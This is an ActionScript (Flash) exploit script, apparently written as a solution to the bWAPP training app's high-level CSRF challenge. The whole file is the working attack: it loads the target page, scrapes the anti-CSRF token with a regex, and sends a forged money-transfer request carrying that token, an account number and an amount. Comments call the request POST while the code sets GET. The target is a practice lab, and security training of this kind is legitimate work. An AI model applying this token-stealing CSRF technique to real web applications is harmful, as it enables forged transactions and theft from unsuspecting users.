// BypassCSRFtransferMoney bWaPP
// Author: Vishal_alt
// BwApp High CSRF challenge



package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class csrfBypass extends Sprite {
  public function csrfBypass() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "http://mybuggy.app/bWAPP/csrf_2.php";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }


  private function eventHandler(event:Event):void {
   // This assigns the reponse from the first 
   // request to "reponse". The antiCSRF token is
   // somwhere in this reponse
   var response:String = event.target.data;

   // This line looks for the line in the response 
   //that contains the CSRF token
   var CSRF:Array = response.match(/token.*/);

   // This line extracts the value of the CSRF token, 
   // and assigns it to "token"
   var token:String = CSRF[0].split("\"")[4];

   // These next two lines create the prefix and the 
   // suffix for the POST request
   var prefix:String = "token="
   var suffix:String = "&account=123-45678-90&amount=900&action=transfer"

   // This section sets up a new URLRequest object and
   // sets the method to post   
   var sendTo:String = "http://mybuggy.app/bWAPP/csrf_2.php?"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.GET;

   // This next line sets the data portion of the GET
   // request to the "prefix" + "token" + "suffix"
   sendRequest.data = prefix.concat(token,suffix)
   
   // Time to create the URLLoader object and send the 
   // POST request containing the CSRF token
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}